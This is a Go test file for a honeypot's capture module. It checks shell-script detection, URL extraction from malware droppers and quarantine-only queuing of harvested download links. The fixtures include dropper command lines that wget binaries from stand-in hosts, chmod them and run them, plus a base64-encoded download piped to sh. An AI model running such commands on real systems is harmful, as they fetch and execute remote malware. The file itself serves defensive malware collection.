package capture

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/config"
	"github.com/networkshard/shardlure/internal/store"
)

func TestIsTextScript(t *testing.T) {
	tar := make([]byte, 512)
	copy(tar, "file.sh")
	copy(tar[257:], "ustar\x0000")
	binary := make([]byte, 200)
	for i := range binary {
		binary[i] = byte(1 + i%31) // control bytes, no NUL
	}
	cases := []struct {
		name string
		head []byte
		want bool
	}{
		{"elf", []byte("\x7fELF\x02\x01\x01 wget http://x/y"), false},
		{"pe", []byte("MZ this program cannot be run in DOS mode"), false},
		{"zip", []byte("PK\x03\x04 wget http://x/y"), false},
		{"gzip", []byte("\x1f\x8b\x08 wget"), false},
		{"bzip2", []byte("BZh91AY&SY"), false},
		{"xz", []byte("\xfd7zXZ\x00 wget"), false},
		{"7z", []byte("7z\xbc\xaf\x27\x1c wget"), false},
		{"tar", tar, false},
		{"nul", []byte("#!/bin/sh\nwget http://x/y\x00\n"), false},
		{"binary", binary, false},
		{"empty", nil, false},
		{"shebang dropper", []byte("#!/bin/sh\ncd /tmp; wget http://203.0.113.5/bins/x86\r\n\tchmod 777 *\n"), true},
		{"no shebang", []byte("cd /tmp || cd /var/run\nwget http://203.0.113.5/x; sh x\n"), true},
		{"utf8 comments", []byte("#!/bin/bash\n# загрузка — 下载器\nwget http://203.0.113.5/x\n"), true},
	}
	for _, c := range cases {
		if got := isTextScript(c.head); got != c.want {
			t.Errorf("%s: isTextScript=%v want %v", c.name, got, c.want)
		}
	}
}

func TestHarvestURLs(t *testing.T) {
	got := HarvestURLs("cd /tmp; wget http://203.0.113.5/bins/x86; wget http://203.0.113.5/bins/mips; chmod 777 *; ./x86", 32)
	if fmt.Sprint(got) != "[http://203.0.113.5/bins/x86 http://203.0.113.5/bins/mips]" {
		t.Fatalf("dropper: %v", got)
	}
	got = HarvestURLs("#!/bin/sh\necho d2dldCBodHRwOi8vMjAzLjAuMTEzLjkvc3RhZ2Uy|base64 -d|sh\n", 32)
	if fmt.Sprint(got) != "[http://203.0.113.9/stage2]" {
		t.Fatalf("base64 line: %v", got)
	}
	var b strings.Builder
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&b, "wget http://203.0.113.5/b/%d\n", i)
	}
	if got = HarvestURLs(b.String(), 32); len(got) != 32 || got[31] != "http://203.0.113.5/b/31" {
		t.Fatalf("40 URLs: %d %v", len(got), got)
	}
	got = HarvestURLs("wget http://203.0.113.5/a\ncurl -O http://203.0.113.5/a\nwget http://203.0.113.5/a", 32)
	if fmt.Sprint(got) != "[http://203.0.113.5/a]" {
		t.Fatalf("duplicates: %v", got)
	}
	long := "wget http://203.0.113.5/hidden " + strings.Repeat("A", 64<<10) + "\nwget http://203.0.113.5/kept\n"
	if got = HarvestURLs(long, 32); fmt.Sprint(got) != "[http://203.0.113.5/kept]" {
		t.Fatalf("over-long line: %v", got)
	}
	if got = HarvestURLs("cowrie-download:abc ftp://203.0.113.5/x", 32); len(got) != 0 {
		t.Fatalf("pseudo-key or non-http kept: %v", got)
	}
}

// Run harvests a fetched dropper under quarantine/ into pending child rows
// and never fetches them itself: the ArtifactWorker does that later.
func TestRunHarvestsScriptsAndOnlyEnqueues(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "harvest.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	cfg := config.Config{DataDir: t.TempDir()}
	cfg.Capture.Enabled = true
	cfg.Capture.QuarantineFetch = true
	cfg.Capture.HarvestScripts = true
	r := NewRunner(st, cfg)
	r.fetch.TestLoopback = true
	calls := 0
	r.fetch.Client = &http.Client{Transport: queueTransport(func(req *http.Request) (*http.Response, error) {
		calls++
		return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader("payload")), Header: make(http.Header)}, nil
	})}
	quarantine := filepath.Join(r.fetch.EvidenceDir, "quarantine")
	if err := os.MkdirAll(quarantine, 0o700); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	write := func(sha string, body []byte, url string) {
		t.Helper()
		p := filepath.Join(quarantine, sha)
		if body != nil {
			if err := os.WriteFile(p, body, 0o600); err != nil {
				t.Fatal(err)
			}
		}
		if err := st.RecordArtifact(store.Artifact{TS: now, SrcIP: "198.51.100.7", SessionID: "s1", URL: url, LocalPath: p,
			SHA256: sha, SizeBytes: 100, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
			t.Fatal(err)
		}
	}
	write(strings.Repeat("a", 64), []byte("#!/bin/sh\ncd /tmp; wget http://203.0.113.5/bins/x86; wget http://203.0.113.5/bins/mips; chmod 777 *; ./x86\n"), "http://203.0.113.5/bins.sh")
	write(strings.Repeat("b", 64), append([]byte("\x7fELF\x02\x01\x01"), []byte(" wget http://203.0.113.6/elf-string")...), "http://203.0.113.6/x")
	write(strings.Repeat("c", 64), nil, "http://203.0.113.7/gone.sh") // retention removed the file
	write(strings.Repeat("d", 64), []byte("wget http://203.0.113.8/after-gone\n"), "http://203.0.113.8/d.sh")

	if _, err := r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if calls != 0 {
		t.Fatalf("Run performed %d network requests", calls)
	}
	due, err := st.DueArtifactCaptures(time.Now(), 10, 5)
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(due)
	if fmt.Sprint(due) != "[http://203.0.113.5/bins/mips http://203.0.113.5/bins/x86 http://203.0.113.8/after-gone]" {
		t.Fatalf("queued children: %v", due)
	}
	// A second run harvests nothing new.
	if _, err := r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if again, _ := st.DueArtifactCaptures(time.Now(), 10, 5); len(again) != 3 {
		t.Fatalf("replay changed the queue: %v", again)
	}

	// Disabled: nothing is read.
	st2, err := store.Open(filepath.Join(t.TempDir(), "off.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st2.Close()
	cfg.Capture.HarvestScripts = false
	r2 := NewRunner(st2, cfg)
	p := filepath.Join(r2.fetch.EvidenceDir, "quarantine", strings.Repeat("e", 64))
	if err := os.WriteFile(p, bytes.Repeat([]byte("wget http://203.0.113.9/x\n"), 2), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := st2.RecordArtifact(store.Artifact{TS: now, URL: "http://203.0.113.9/s.sh", LocalPath: p, SHA256: strings.Repeat("e", 64),
		SizeBytes: 52, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
		t.Fatal(err)
	}
	if _, err := r2.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if due, _ := st2.DueArtifactCaptures(time.Now(), 10, 5); len(due) != 0 {
		t.Fatalf("harvest_scripts=false still queued %v", due)
	}
}
